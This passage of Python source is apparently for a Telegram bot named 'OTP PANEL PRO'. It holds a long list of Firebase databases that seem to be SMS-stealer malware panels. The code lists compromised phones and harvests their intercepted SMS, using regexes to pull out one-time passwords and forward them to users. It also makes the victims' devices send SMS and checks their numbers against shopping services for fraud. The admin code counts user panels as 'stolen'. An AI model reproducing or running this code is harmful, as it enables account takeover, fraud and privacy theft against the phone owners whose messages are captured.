    "https://subhu3-9f156-default-rtdb.firebaseio.com", "https://ewuae-5a253-default-rtdb.firebaseio.com", 
    "https://sada-bcbcd-default-rtdb.firebaseio.com", "https://i-am-devil-9297c-default-rtdb.firebaseio.com", 
    "https://update-cf7a9-default-rtdb.firebaseio.com", "https://carderpanel-default-rtdb.firebaseio.com", 
    "https://anudg-21c1c-default-rtdb.firebaseio.com", "https://suwer-64cd1-default-rtdb.firebaseio.com", 
    "https://afroar-66af-default-rtdb.firebaseio.com", "https://youbabu-default-rtdb.firebaseio.com", 
    "https://e10turnament1-default-rtdb.firebaseio.com", "https://aljajs-default-rtdb.firebaseio.com", 
    "https://dath-da88a-default-rtdb.firebaseio.com", "https://xkpz-f937a-default-rtdb.firebaseio.com", 
    "https://mast-d6890-default-rtdb.asia-southeast1.firebasedatabase.app", 
    "https://adsf-8b4e8-default-rtdb.asia-southeast1.firebasedatabase.app", 
    "https://ramesh-67a2b-default-rtdb.firebaseio.com", "https://gandhi-ji-1-default-rtdb.asia-southeast1.firebasedatabase.app", 
    "https://amoyu--default-rtdb.firebaseio.com", "https://amoyu-default-rtdb.firebaseio.com", 
    "https://rizzlatest-default-rtdb.firebaseio.com", "https://jpicku-47790-default-rtdb.firebaseio.com", 
    "https://rahkiu-1da83-default-rtdb.firebaseio.com", "https://panel-wala-v27-default-rtdb.firebaseio.com", 
    "https://panel-wala-v18-default-rtdb.firebaseio.com", "https://panel-wala-v101-default-rtdb.firebaseio.com", 
    "https://raja-bhaiya-62-default-rtdb.firebaseio.com", "https://panel-wala-v69-default-rtdb.firebaseio.com", 
    "https://panel-wala-v65-default-rtdb.firebaseio.com", "https://panel-wala-v71-default-rtdb.firebaseio.com", 
    "https://rajabhaya-default-rtdb.firebaseio.com", "https://craxs-4c542-default-rtdb.firebaseio.com", 
    "https://strange-2e4aa-default-rtdb.firebaseio.com", "https://udaya-47819-default-rtdb.firebaseio.com", 
    "https://kuldeep-2a4d2-default-rtdb.firebaseio.com", "https://piryankakumari1212c-9f29e-default-rtdb.firebaseio.com", 
    "https://super-keetuby22-default-rtdb.firebaseio.com", "https://ramuuraj-rohrii9800-default-rtdb.firebaseio.com", 
    "https://trytanu-ea837-default-rtdb.firebaseio.com", "https://human-34-kumar-default-rtdb.firebaseio.com", 
    "https://enene-f152b-default-rtdb.firebaseio.com", "https://rr03-c238f-default-rtdb.firebaseio.com", 
    "https://pariva-7cd5e-default-rtdb.firebaseio.com", "https://terrorist-d01a9-default-rtdb.firebaseio.com", 
    "https://subh9owp-default-rtdb.firebaseio.com", "https://project-x-50ab7-default-rtdb.firebaseio.com", 
    "https://ipl2025-62676-default-rtdb.firebaseio.com", "https://darkmeanskala-default-rtdb.firebaseio.com", 
    "https://raazsep18-default-rtdb.firebaseio.com", "https://pmkisan-4e573-default-rtdb.firebaseio.com", 
    "https://pikachu-bykitterfb60-default-rtdb.firebaseio.com", "https://bbbbbb8-a06fb-default-rtdb.firebaseio.com", 
    "https://totla-panel-default-rtdb.firebaseio.com", "https://mukesh-7c9a5-default-rtdb.firebaseio.com", 
    "https://e9turnament1-default-rtdb.firebaseio.com", "https://painislv-default-rtdb.firebaseio.com", 
    "https://rahais-default-rtdb.firebaseio.com", "https://rtomumbai-bc919-default-rtdb.firebaseio.com", 
    "https://asif-2a927-default-rtdb.firebaseio.com", "https://rettiugh-default-rtdb.firebaseio.com", 
    "https://vvvvv-b5eae-default-rtdb.firebaseio.com", "https://jaanubaby-f7b34-default-rtdb.firebaseio.com", 
    "https://jj-gambler-default-rtdb.firebaseio.com", "https://suman-penal-default-rtdb.firebaseio.com", 
    "https://tuuui-60b15-default-rtdb.firebaseio.com", "https://admin-sonu-8a567-default-rtdb.firebaseio.com", 
    "https://rohet10-8919f-default-rtdb.firebaseio.com", "https://zeni-ae60b-default-rtdb.firebaseio.com", 
    "https://maxxx-randi-default-rtdb.firebaseio.com", "https://gulabi-fuddi-default-rtdb.firebaseio.com", 
    "https://comkingdir-default-rtdb.firebaseio.com", "https://tracegod-168d5-default-rtdb.firebaseio.com", 
    "https://uc-op-ca3d2-default-rtdb.firebaseio.com", "https://smsforward-b2198.firebaseio.com", 
    "https://hdrbf-485ec-default-rtdb.firebaseio.com", "https://bunty-51bcc-default-rtdb.firebaseio.com", 
    "https://vishal-x-aravat-default-rtdb.firebaseio.com", "https://admin-cliwny-default-rtdb.firebaseio.com", 
    "https://danish-77fe3-default-rtdb.firebaseio.com", "https://master-admin-6c650-default-rtdb.firebaseio.com", 
    "https://panel-op-feb4d-default-rtdb.firebaseio.com", "https://your-project-id-default-rtdb.firebaseio.com", 
    "https://pm23-98f32-default-rtdb.firebaseio.com", "https://iiiii-ade0e-default-rtdb.firebaseio.com", 
    "https://pint-f465b-default-rtdb.firebaseio.com", "https://admin-panel-bfcdc-default-rtdb.firebaseio.com", 
    "https://callmebitchfumckyou-default-rtdb.firebaseio.com", "https://hood-4ba1e-default-rtdb.firebaseio.com", 
    "https://lucifer-spreader-default-rtdb.firebaseio.com", "https://totla-axis-default-rtdb.firebaseio.com", 
    "https://rgggggggggg-e2547-default-rtdb.firebaseio.com", "https://bulbul8084-9a5df-default-rtdb.firebaseio.com", 
    "https://systumm-c8526-default-rtdb.firebaseio.com", "https://ravan-98ef1-default-rtdb.firebaseio.com", 
    "https://yellow-pannel-dadc7-default-rtdb.firebaseio.com", "https://pmkishan8-6b70f-default-rtdb.firebaseio.com", 
    "https://no-admin-e0a30-default-rtdb.firebaseio.com", "https://sexypayload-default-rtdb.firebaseio.com", 
    "https://love-13ffc-default-rtdb.firebaseio.com", "https://cust-3-882d8-default-rtdb.firebaseio.com", 
    "https://cracks-v1-default-rtdb.firebaseio.com", "https://loof-earn-default-rtdb.firebaseio.com", 
    "https://goat-100a8-default-rtdb.firebaseio.com", "https://asif-alam991-default-rtdb.firebaseio.com", 
    "https://indul29-default-rtdb.firebaseio.com", "https://rto-31b04-default-rtdb.firebaseio.com", 
    "https://project.firebaseio.com", "https://ppoi02-default-rtdb.firebaseio.com", 
    "https://rrt1-c797a-default-rtdb.firebaseio.com", "https://instafud-default-rtdb.firebaseio.com", 
    "https://mahanivip-kituk10-default-rtdb.firebaseio.com", "https://ahisjija-default-rtdb.firebaseio.com", 
    "https://dharmesh-panel-default-rtdb.firebaseio.com", "https://maxbhai-b8d3a-default-rtdb.firebaseio.com", 
    "https://dhumm-90a53-default-rtdb.firebaseio.com", "https://vdgsh-623ed-default-rtdb.firebaseio.com", 
    "https://miyakhalifa-143d5-default-rtdb.firebaseio.com", "https://sudhir-suexs-seox-default-rtdb.firebaseio.com", 
    "https://article-efd36-default-rtdb.firebaseio.com", "https://adutappbylucy-default-rtdb.firebaseio.com", 
    "https://artikumari-abc97-default-rtdb.firebaseio.com", "https://gigapaid-39e9c-default-rtdb.firebaseio.com", 
    "https://sonic-d5c1a-default-rtdb.firebaseio.com", "https://download-b7393-default-rtdb.firebaseio.com", 
    "https://rajababukvirat-default-rtdb.firebaseio.com", "https://bobnewloda-default-rtdb.firebaseio.com", 
    "https://rto-02-april06-default-rtdb.firebaseio.com", "https://deepak-c22e3-default-rtdb.firebaseio.com", 
    "https://angeladmin-9dedc-default-rtdb.firebaseio.com", "https://axis-suraj-tele-apcd001-default-rtdb.firebaseio.com", 
    "https://test-firebase.firebaseio.com", "https://upandar-bb51e-default-rtdb.firebaseio.com", 
    "https://demonrat-aa782-default-rtdb.firebaseio.com", "https://ueuwuw-default-rtdb.firebaseio.com", 
    "https://riyy-e012e-default-rtdb.firebaseio.com", "https://projectpksk05102025-default-rtdb.firebaseio.com", 
    "https://haab-b3370-default-rtdb.firebaseio.com", "https://rolex-carder-default-rtdb.firebaseio.com", 
    "https://jkhsadfhjk-default-rtdb.firebaseio.com", "https://rtoo-6c8e6-default-rtdb.firebaseio.com", 
    "https://takul-cf410-default-rtdb.firebaseio.com", "https://priysnshuu-default-rtdb.firebaseio.com", 
    "https://rajkumar-b6cbe-default-rtdb.firebaseio.com", "https://fir-new-fe8b8-default-rtdb.firebaseio.com", 
    "https://jonisins-52271-default-rtdb.firebaseio.com", "https://dusman-abf8b-default-rtdb.firebaseio.com", 
    "https://test-firebaseio.com", "https://harrwp-6be36-default-rtdb.firebaseio.com", 
    "https://sandycall-18b15-default-rtdb.firebaseio.com", "https://seuihd-default-rtdb.firebaseio.com", 
    "https://suihd-default-rtdb.firebaseio.com", "https://ajitttt-17678-default-rtdb.firebaseio.com", 
    "https://pmkal-72db3-default-rtdb.firebaseio.com", "https://rajkumar-5af9d-default-rtdb.firebaseio.com"
]))

DATABASES = {f"P_{i}": url for i, url in enumerate(RAW_URLS)}

# ═══════════════════════════════════════════════════════
#  DATA CLASSES
# ═══════════════════════════════════════════════════════

class Device:
    __slots__ = (
        "id", "name", "status", "battery", "timestamp",
        "numbers", "device_info", "sms_path", "base_url", "db_tag", "last_sms_ts"
    )
    def __init__(self, id, name, status, battery, timestamp, numbers, device_info, sms_path, base_url, db_tag, last_sms_ts=0.0):
        self.id = id
        self.name = name
        self.status = status
        self.battery = battery
        self.timestamp = timestamp
        self.numbers = numbers
        self.device_info = device_info
        self.sms_path = sms_path
        self.base_url = base_url
        self.db_tag = db_tag
        self.last_sms_ts = last_sms_ts

# ═══════════════════════════════════════════════════════
#  INDIVIDUAL FILE DATA SYSTEM
# ═══════════════════════════════════════════════════════

def init_dirs():
    os.makedirs(USERS_DIR, exist_ok=True)
    os.makedirs(CLONES_DIR, exist_ok=True)
    os.makedirs(SYS_DIR, exist_ok=True)
    if not os.path.exists(SMS_LOG_FILE):
        with open(SMS_LOG_FILE, "w", encoding="utf-8") as f:
            f.write("--- SYSTEM MASTER SMS LOG ---\n")

def load_data():
    global all_users, CLONES, SETTINGS
    init_dirs()
    
    set_path = os.path.join(SYS_DIR, "settings.json")
    if os.path.exists(set_path):
        try:
            with open(set_path, "r", encoding="utf-8") as f:
                SETTINGS.update(json.load(f))
        except: pass

    for fname in os.listdir(USERS_DIR):
        if fname.endswith(".json"):
            try:
                uid = int(fname.split(".")[0])
                with open(os.path.join(USERS_DIR, fname), "r", encoding="utf-8") as f:
                    all_users[uid] = json.load(f)
                    all_users[uid].setdefault("custom_dbs", [])
                    all_users[uid].setdefault("referrals", 0)
                    all_users[uid].setdefault("vip_until", 0.0)
                    all_users[uid].setdefault("referred_by", None)
                    all_users[uid].setdefault("user_panels_mode", False)
            except: pass
                
    for fname in os.listdir(CLONES_DIR):
        if fname.endswith(".json"):
            try:
                with open(os.path.join(CLONES_DIR, fname), "r", encoding="utf-8") as f:
                    cdata = json.load(f)
                    restored_users = {int(k): v for k, v in cdata.get("users", {}).items()}
                    cdata["users"] = restored_users
                    token = cdata.get("bot_token")
                    if token:
                        CLONES[token] = cdata
            except: pass
            
    for adm in ADMIN_IDS:
        if adm not in all_users:
            all_users[adm] = {
                "name": "Supreme Owner",
                "username": "",
                "joined_at": datetime.now().strftime("%d %b %Y %I:%M %p"),
                "verified": True,
                "referrals": 0,
                "coins": 999999,
                "vip_until": 2e10,
                "vip_paused_left": 0.0,
                "vip_expired_purchases": 0,
                "bot_expired_purchases": 0,
                "pdb_expired_purchases": 0,
                "otp_count": 0,
                "bots_created": 0,
                "bonus_10_received": True,
                "custom_dbs": [],
                "user_panels_mode": False,
                "selected_panel": "ALL",
                "transactions": [],
                "referred_by": None,
                "banned": False
            }
            save_user(adm)

def save_user(uid: int):
    init_dirs()
    if uid in all_users:
        with open(os.path.join(USERS_DIR, f"{uid}.json"), "w", encoding="utf-8") as f:
            json.dump(all_users[uid], f, indent=4)

def save_settings():
    init_dirs()
    with open(os.path.join(SYS_DIR, "settings.json"), "w", encoding="utf-8") as f:
        json.dump(SETTINGS, f, indent=4)

def _sync_save_data():
    save_settings()
    for uid in list(all_users.keys()):
        save_user(uid)

async def save_data_async():
    await asyncio.to_thread(_sync_save_data)

def master_log_sms(number: str, message: str, otp: str):
    try:
        t = datetime.now().strftime("%d-%b-%Y %I:%M:%S %p")
        log_line = f"[{t}] NUM: {number} | OTP: {otp or 'N/A'} | MSG: {message}\n"
        with open(SMS_LOG_FILE, "a", encoding="utf-8") as f:
            f.write(log_line)
    except: pass

async def auto_save_loop():
    while True:
        try:
            await asyncio.sleep(60)
            await save_data_async()
            if len(seen_ids) > 80000:
                seen_ids.clear()
                gc.collect()
        except Exception:
            await asyncio.sleep(5)

async def hourly_admin_backup(app: Application):
    while True:
        await asyncio.sleep(3600)
        try:
            total_users = len(all_users)
            vip_users = sum(1 for u in all_users.values() if u.get("vip_until", 0) > time.time() or u.get("vip_until", 0) > 1e10)
            free_users = total_users - vip_users
            total_custom_panels = sum(len(get_user_dbs(u)) for uid, u in all_users.items() if uid not in ADMIN_IDS)

            report = (
                "📊 **HOURLY ADMIN REPORT**\n\n"
                f"👤 **Total Users:** {total_users}\n"
                f"👑 **VIP/Admin Users:** {vip_users}\n"
                f"🆓 **Free Users:** {free_users}\n"
                f"🎯 **Total User Panels (Stealable):** {total_custom_panels}\n\n"
                "Auto-Backup Data Attached."
            )
            
            file_path = os.path.join(SYS_DIR, f"Backup_{int(time.time())}.json")
            with open(file_path, "w", encoding="utf-8") as f:
                json.dump(all_users, f, indent=4)
            
            for adm in ADMIN_IDS:
                try:
                    await app.bot.send_document(adm, document=open(file_path, "rb"), caption=report, parse_mode="Markdown")
                except: pass
            
            try: os.remove(file_path)
            except: pass
        except Exception as e: 
            tlog(f"Hourly Backup Error: {e}")

# ═══════════════════════════════════════════════════════
#  ANTI-SPAM & FORCE JOIN UTILS
# ═══════════════════════════════════════════════════════

def get_user_dbs(uinfo: dict) -> list:
    dbs = uinfo.get("custom_dbs", [])
    valid_urls = []
    for db in dbs:
        if isinstance(db, str): 
            valid_urls.append(db)
        elif isinstance(db, dict):
            valid_urls.append(db.get("url"))
    if isinstance(uinfo.get("custom_db"), str) and uinfo["custom_db"] not in valid_urls:
        valid_urls.append(uinfo["custom_db"])
    return list(set(valid_urls))

def is_spamming(user_id: int) -> bool:
    if user_id in ADMIN_IDS: return False
    now = time.time()
    last_click = user_cooldowns.get(user_id, 0)
    if now - last_click < 1.0:  
        return True
    user_cooldowns[user_id] = now
    return False

def tlog(msg: str) -> None:
    t = datetime.now().strftime("%I:%M:%S %p")
    print(f"[{t}]  {msg}", flush=True)

# 🔴 100% STRICT FORCE JOIN CHECKER (BUG FIXED)
async def check_force_join(bot, user_id: int) -> bool:
    if user_id in ADMIN_IDS: return True
    for chat in FORCE_JOIN_CHATS:
        try:
            member = await bot.get_chat_member(chat, user_id)
            status = str(getattr(member, 'status', '')).split('.')[-1].lower()
            if status in ['left', 'kicked', 'banned']:
                return False
        except Exception:
            return False 
    return True

async def global_error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    err_str = str(context.error)
    if any(e in err_str for e in ["Forbidden", "Chat not found", "bot was blocked", "not modified", "Message to edit not found", "ChatNotFound", "ConnectionResetError", "WinError 10054"]):
        return
    if re.match(r"^-?\d+$", err_str.strip()): return
    tlog(f"Telegram API Error: {err_str}")

# ═══════════════════════════════════════════════════════
#  FAST HTTP SESSION MANAGER 
# ═══════════════════════════════════════════════════════

async def get_http_session() -> aiohttp.ClientSession:
    global _http_session
    if _http_session is None or _http_session.closed:
        connector = aiohttp.TCPConnector(limit=1500, keepalive_timeout=30, enable_cleanup_closed=True)
        _http_session = aiohttp.ClientSession(connector=connector)
    return _http_session

async def fb_get(path: str, base: str) -> Optional[dict]:
    try:
        session = await get_http_session()
        url = f"{base}/{path}.json" if path else f"{base}/.json?shallow=true"
        if not path: url = url.replace("?shallow=true", ".json")
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as r:
            if r.status != 200: return None
            data = await r.json(content_type=None)
            return data if isinstance(data, dict) else None
    except Exception: return None

async def fb_keys(path: str, base: str) -> list[str]:
    try:
        session = await get_http_session()
        url = f"{base}/{path}.json?shallow=true" if path else f"{base}/.json?shallow=true"
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as r:
            if r.status != 200: return []
            data = await r.json(content_type=None)
            return list(data.keys()) if isinstance(data, dict) else []
    except Exception: return []

# ═══════════════════════════════════════════════════════
#  API CHECKER FUNCTIONS 
# ═══════════════════════════════════════════════════════

async def check_number_api(service: str, number: str, retries=3) -> dict:
    async with WORKER_SEMAPHORE: 
        clean_number = re.sub(r"\D", "", str(number))[-10:]
        api_keys = SYS_SETTINGS.get("api_keys", [])
        if not api_keys: return {"status": "error", "message": "No API Keys configured.", "ms": 0}

        for attempt in range(retries):
            async with API_LOCK:
                if not hasattr(check_number_api, 'k_idx'): check_number_api.k_idx = 0
                selected_key = api_keys[check_number_api.k_idx % len(api_keys)]
                check_number_api.k_idx += 1

            payload = {"service": service.lower(), "number": clean_number}
            start_req = time.time()
            try:
                session = await get_http_session()
                async with session.post(
                    "https://superassets.in/api/v1/check", 
                    json=payload, 
                    headers={"X-API-Key": selected_key, "Content-Type": "application/json"}, 
                    timeout=aiohttp.ClientTimeout(total=15)
                ) as r:
                    req_ms = int((time.time() - start_req) * 1000)
                    if r.status == 200: 
                        res = await r.json()
                        res["ms"] = req_ms
                        return res
                    elif r.status == 429:
                        await asyncio.sleep(1.5 * (attempt + 1))
                        continue
                    else: 
                        return {"status": "error", "message": f"HTTP {r.status}", "ms": req_ms}
            except Exception as e: 
                if attempt == retries - 1:
                    return {"status": "error", "message": "Timeout", "ms": int((time.time() - start_req) * 1000)}
                await asyncio.sleep(1)

async def fb_send_sms(device, to_number: str, msg: str):
    async with WORKER_SEMAPHORE:
        try:
            base_node = device.sms_path.replace("/sms", "").replace("user_sms", "user_data")
            send_url = f"{device.base_url}/{base_node}/sendSMS.json"
            payload = {"number": to_number, "phone": to_number, "phoneNo": to_number, "message": msg, "msg": msg, "text": msg, "status": "pending"}
            session = await get_http_session()
            async with session.post(send_url, json=payload, timeout=aiohttp.ClientTimeout(total=5)) as r:
                pass
        except: pass

async def verify_recent_sms(device, max_age_sec=1800) -> tuple[bool, float]:
    try:
        session = await get_http_session()
        url = f"{device.base_url}/{device.sms_path}.json?orderBy=\"$key\"&limitToLast=2"
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as r:
            if r.status == 200:
                data = await r.json(content_type=None)
                if isinstance(data, dict) and len(data) > 0:
                    max_sms_ts = 0
                    for k, sms_val in data.items():
                        if isinstance(sms_val, dict):
                            t_val = sms_val.get("timestamp") or 0
                            try:
                                t_float = float(t_val)
                                if t_float > 1e11: t_float /= 1000
                                if t_float > max_sms_ts: max_sms_ts = t_float
                            except: pass
                    if max_sms_ts > 0 and (time.time() - max_sms_ts) <= max_age_sec:
                        return True, max_sms_ts
                    return False, max_sms_ts
    except: pass
    return False, 0.0

async def continuous_prefetch_worker(service: str):
    while True:
        try:
            pool = PREFETCH_POOL.setdefault(service, [])
            if len(pool) >= 5: 
                await asyncio.sleep(5)
                continue
                
            all_devices = GLOBAL_DEVICE_CACHE.get("ALL", [])
            if not all_devices:
                await asyncio.sleep(5)
                continue
                
            fresh_devices = []
            for d in all_devices:
                if d.status == "online" and d.numbers:
                    is_valid, last_ts = await verify_recent_sms(d, max_age_sec=1800) 
                    if is_valid:
                        d.last_sms_ts = last_ts
                        fresh_devices.append(d)
                        
            if not fresh_devices:
                await asyncio.sleep(10)
                continue
                
            random.shuffle(fresh_devices)
            in_pool_nums = {item["num"] for item in pool}
            
            for d in fresh_devices[:30]:
                num = d.numbers[0]
                if num in in_pool_nums:
                    continue
                    
                seen = False
                for cid, s_set in user_seen_unreg.items():
                    if num in s_set: seen = True
                if seen: continue
                    
                res = await check_number_api(service, num)
                if isinstance(res, dict) and not res.get("status") == "error":
                    is_reg = res.get("registered", False) or res.get("is_registered", False) or (str(res.get("result", "")).lower() == "registered")
                    if not is_reg:
                        pool.append({"device": d, "res": res, "num": num})
                        break 
                        
                await asyncio.sleep(0.5)
        except Exception: pass
        await asyncio.sleep(3)

# ═══════════════════════════════════════════════════════
#  UTILITY FORMATTERS & MENUS
# ═══════════════════════════════════════════════════════

def get_checker_menu(prefix="chk_srv:"):
    kb = [
        [InlineKeyboardButton("🥬 Bigbasket", callback_data=f"{prefix}bigbasket"), InlineKeyboardButton("🛍️ Meesho", callback_data=f"{prefix}meesho"), InlineKeyboardButton("🪐 Plutos", callback_data=f"{prefix}plutos")],
        [InlineKeyboardButton("⭐ Starexch", callback_data=f"{prefix}starexch"), InlineKeyboardButton("🍔 Swiggy", callback_data=f"{prefix}swiggy"), InlineKeyboardButton("🛒 Flipkart", callback_data=f"{prefix}flipkart")],
        [InlineKeyboardButton("👗 Shein", callback_data=f"{prefix}shein"), InlineKeyboardButton("👚 Myntra", callback_data=f"{prefix}myntra"), InlineKeyboardButton("🏨 Oyo", callback_data=f"{prefix}oyo")],
        [InlineKeyboardButton("🏢 Mantrimall", callback_data=f"{prefix}mantrimall"), InlineKeyboardButton("🟡 Blinkit", callback_data=f"{prefix}blinkit")],
        [InlineKeyboardButton("🛏️ Brevistay", callback_data=f"{prefix}brevistay"), InlineKeyboardButton("⚡ Ajio", callback_data=f"{prefix}ajio"), InlineKeyboardButton("📦 Amazon", callback_data=f"{prefix}amazon")],
        [InlineKeyboardButton("📱 MyJio", callback_data=f"{prefix}myjio"), InlineKeyboardButton("👓 Lenskart", callback_data=f"{prefix}lenskart")],
        [InlineKeyboardButton("❌ Close", callback_data="close_msg")]
    ]
    return InlineKeyboardMarkup(kb)

def format_checker_result(service: str, number: str, is_reg: bool, ms: int, is_error: bool = False, err_msg: str = ""):
    srv_name, emoji = service.capitalize(), "✨"
    for row in get_checker_menu().inline_keyboard:
        for btn in row:
            if service.lower() in btn.text.lower():
                parts = btn.text.split(" ")
                emoji, srv_name = parts[0], " ".join(parts[1:])
                break
    
    display_num = number if str(number).startswith("+") else f"+{number}"
    
    if is_error: return f"⚠️ <b>ERROR</b>\n\n{emoji} <b>{srv_name}</b>\n📱 {display_num}\n⚡ {ms} ms\n\n<i>{err_msg}</i>"
    return f"<b>{'✅ REGISTERED' if is_reg else '❌ UNREGISTERED'}</b>\n\n{emoji} <b>{srv_name}</b>\n📱 {display_num}\n⚡ {ms} ms"

def get_reply_menu(chat_id: int) -> ReplyKeyboardMarkup:
    is_admin = chat_id in ADMIN_IDS
    keys = [
        [KeyboardButton("Devices List"), KeyboardButton("Auto-Check Panels")],
        [KeyboardButton("Manual Checker"), KeyboardButton("Scan Hidden Devices")],
        [KeyboardButton("Add Custom Panel"), KeyboardButton("Delete Custom Panel")],
        [KeyboardButton("Refer & Earn VIP"), KeyboardButton("Help / Get Panels")]
    ]
    if is_admin:
        keys.append([KeyboardButton("Admin Panel"), KeyboardButton("Super Admin")])
    return ReplyKeyboardMarkup(keys, resize_keyboard=True)

def device_label(d: Device) -> str:
    if d.numbers: return " & ".join(d.numbers)
    return f"{d.name} ({d.id[:8]})"

def device_list_header(devices: list[Device], page: int = 0) -> str:
    online  = sum(1 for d in devices if d.status == "online")
    offline = len(devices) - online
    total_pages = max(1, (len(devices) + PAGE_SIZE - 1) // PAGE_SIZE)
    return (
        f"OTP PANEL PRO\n━━━━━━━━━━━━━━━━━━\nOnline: {online}   Offline: {offline}\n"
        f"Total: {len(devices)} Devices\nPage {page + 1} of {total_pages}\n━━━━━━━━━━━━━━━━━━\nSelect a number below:"
    )

def device_list_keyboard(devices: list[Device], page: int = 0) -> InlineKeyboardMarkup:
    total_pages = max(1, (len(devices) + PAGE_SIZE - 1) // PAGE_SIZE)
    page        = max(0, min(page, total_pages - 1))
    start       = page * PAGE_SIZE
    page_devs   = devices[start : start + PAGE_SIZE]
    rows = []

    def _btn(d: Device) -> InlineKeyboardButton:
        tag  = f"[{d.db_tag}] "
        icon = "🟢" if d.status == "online" else "🔴"
        if d.numbers:
            lbl = f"{icon} {tag}{d.numbers[0]}"
            if len(d.numbers) > 1: lbl += f" & {d.numbers[1]}"
        else:
            lbl = f"{icon} {tag}{d.name} ({d.id[:6]})"
        return InlineKeyboardButton(lbl, callback_data=f"sel:{d.id}")

    for d in page_devs: rows.append([_btn(d)])

    nav = []
    if page > 0: nav.append(InlineKeyboardButton("Prev", callback_data=f"pg:{page - 1}"))
    nav.append(InlineKeyboardButton(f"{page + 1}/{total_pages}", callback_data="noop"))
    if page < total_pages - 1: nav.append(InlineKeyboardButton("Next", callback_data=f"pg:{page + 1}"))
    rows.append(nav)
    rows.append([InlineKeyboardButton("Refresh", callback_data="home"), InlineKeyboardButton("Online Only", callback_data="online")])
    rows.append([InlineKeyboardButton("Close", callback_data="close_msg")])
    return InlineKeyboardMarkup(rows)

def online_only_keyboard(devices: list[Device]) -> InlineKeyboardMarkup:
    online = [d for d in devices if d.status == "online"]
    rows = []
    if online:
        for d in online:
            tag = f"[{d.db_tag}] "
            if d.numbers:
                lbl = f"🟢 {tag}{d.numbers[0]}"
                if len(d.numbers) > 1: lbl += f" & {d.numbers[1]}"
            else:
                lbl = f"🟢 {tag}{d.name} ({d.id[:6]})"
            rows.append([InlineKeyboardButton(lbl, callback_data=f"sel:{d.id}")])
    else:
        rows.append([InlineKeyboardButton("No devices online", callback_data="noop")])
    rows.append([InlineKeyboardButton("Refresh", callback_data="online"), InlineKeyboardButton("All Numbers", callback_data="pg:0")])
    rows.append([InlineKeyboardButton("Close", callback_data="close_msg")])
    return InlineKeyboardMarkup(rows)

def fmt_num(n: str) -> str:
    c = re.sub(r"\D", "", str(n))
    if c.startswith("91") and len(c) == 12: return f"+{c}"
    if len(c) == 10: return f"+91{c}"
    if len(c) > 4: return f"+{c}"
    return c

def extract_all_nums(*dicts) -> list[str]:
    nums = []
    keys_to_check = ["sim1Number", "sim2Number", "numberSim1", "numberSim2", "mobNo", "phoneNumber", "phone", "sim1", "sim2", "mobile"]
    for d in dicts:
        if not isinstance(d, dict): continue
        for k in keys_to_check:
            val = str(d.get(k, ""))
            if val and len(re.sub(r"\D", "", val)) > 4:
                nums.append(fmt_num(val))
    return list(set(nums))

def bat_emoji(pct: int) -> str:
    return "🔋" if pct >= 20 else "🪫"

OTP_PATTERNS = [
    re.compile(r"OTP[^\d]*(\d{4,8})",        re.IGNORECASE),
    re.compile(r"code[^\d]*(\d{4,8})",       re.IGNORECASE),
    re.compile(r"password[^\d]*(\d{4,8})",   re.IGNORECASE),
    re.compile(r"\b(G-\d{6})\b",             re.IGNORECASE), 
    re.compile(r"\b([A-Z0-9]{5,8})\b",       re.IGNORECASE), 
    re.compile(r"\b(\d{6})\b"),
    re.compile(r"\b(\d{4})\b"),
]

def extract_otp(text: str) -> Optional[str]:
    for pat in OTP_PATTERNS:
        m = pat.search(text)
        if m: return m.group(1)
    return None

def parse_battery(val) -> int:
    if isinstance(val, (int, float)): return int(val)
    if isinstance(val, str):
        digits = re.sub(r"\D", "", val)
        return int(digits) if digits else 0
    return 0

def parse_status_str(val) -> str:
    if not val: return "offline"
    return "online" if str(val).lower() == "online" else "offline"

def parse_status_bool(val) -> str:
    return "online" if val is True else "offline"

def sms_date(sms: dict) -> str:
    date_str = sms.get("date") or sms.get("receivedDate") or sms.get("recivedDate")
    if date_str: return date_str
    if sms.get("timestamp"):
        try:
            ts = float(sms["timestamp"])
            if ts > 1e11: ts /= 1000
            return datetime.fromtimestamp(ts).strftime("%d %b %Y %I:%M %p")
        except: pass
    return "N/A"

def seen_key(device_id: str, k: str) -> str:
    return f"{device_id}/{k}"

def format_sms_block_markdown(sms: dict) -> tuple[str, Optional[str]]:
    body   = sms.get("body") or sms.get("message") or sms.get("text") or ""
    otp    = extract_otp(body)
    date   = sms_date(sms)
    sender = sms.get("sender") or "Unknown"
    
    if otp:
        block = f"🔹 **From:** `{sender}`\n📅 **Date:** {date}\n🔑 **OTP:** `{otp}`\n✉️ **Msg:** {body}"
    else:
        block = f"🔹 **From:** `{sender}`\n📅 **Date:** {date}\n✉️ **Msg:** {body}"
        
    return block, otp

def auto_forward_msg(sms: dict, num_label: str) -> str:
    body   = sms.get("body") or sms.get("message") or sms.get("text") or ""
    otp    = extract_otp(body)
    date   = sms_date(sms)
    sim    = sms.get("sim_number") or ""
    sender = sms.get("sender") or "Unknown"
    
    if otp:
        sim_line = f"│ SIM : {sim}\n" if sim else ""
        return f"NEW OTP RECEIVED\n━━━━━━━━━━━━━━━━━━\n│ OTP : {otp}\n│ Number : {num_label}\n│ From : {sender}\n│ Date : {date}\n{sim_line}━━━━━━━━━━━━━━━━━━\n{body}"
    return f"NEW SMS RECEIVED\n━━━━━━━━━━━━━━━━━━\nNumber : {num_label}\nFrom : {sender}\nDate : {date}\n━━━━━━━━━━━━━━━━━━\n{body}"

def device_action_keyboard(dev_id: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("View Fast Inbox", callback_data=f"msgs:{dev_id}"), InlineKeyboardButton("Device Info", callback_data=f"info:{dev_id}")],
        [InlineKeyboardButton("Disconnect & Back", callback_data="home")],
    ])

def admin_panel_text(bot_token: str, chat_id: int) -> str:
    users_db = all_users
    total    = len(users_db)
    total_otps = sum(u.get("otp_count", 0) for u in users_db.values())
    stolen_panels = sum(len(get_user_dbs(u)) for uid, u in users_db.items() if uid not in ADMIN_IDS)
    
    text = f"ADMIN PANEL (Private)\n━━━━━━━━━━━━━━━━━━\nTotal Users    : {total}\nTotal OTP Views: {total_otps}\n"
    text += f"🎯 **Users Custom Panels:** {stolen_panels}\n"
    text += f"━━━━━━━━━━━━━━━━━━\nUpdated: {datetime.now().strftime('%d %b %Y %I:%M %p')}"
    return text

def admin_keyboard(bot_token: str, chat_id: int) -> InlineKeyboardMarkup:
    is_ghost = all_users.get(chat_id, {}).get("user_panels_mode", False)
